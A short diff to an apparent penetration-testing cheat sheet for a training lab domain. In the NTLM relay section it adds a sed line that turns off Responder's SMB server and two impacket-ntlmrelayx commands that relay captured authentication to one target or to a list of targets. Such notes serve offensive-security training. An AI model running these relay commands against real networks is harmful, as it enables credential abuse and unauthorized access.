@@ -710,7 +710,10 @@ Enter-PSSession ws01.inlanefreight.local
 # Lateral Movement
 ## NTLM Relay 
 ```bash
-impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c 
+sed -i "s/SMB = On/SMB = Off/" /etc/responder/Responder.conf
+
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
+impacket-ntlmrelayx -smb2support -tf relayTargets.txt -c
 ```
 ## Inveigh
 ```powershell
